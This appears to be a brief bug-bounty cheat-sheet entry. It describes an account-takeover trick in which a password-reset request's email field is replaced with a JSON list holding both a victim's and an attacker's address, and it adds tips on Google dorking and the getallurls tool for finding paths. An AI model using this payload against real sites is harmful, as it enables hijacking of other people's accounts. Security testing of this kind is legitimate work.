Password reset via email
```shell
If the request to reset the password via email sends data like this
{
	"email":"victim@mail.com"
}

You can try making a list of emails as payload
{
	"email":[
	"victim@mail.com",
	"attacker@mail.com"
	]
}

This way both emails can recieve the password reset mail.
```

If you run into 404 pages you can try google dorking to find some paths.
```
google: "target.com" # uses exact words in searching
```

And for more discovery try `getallurls`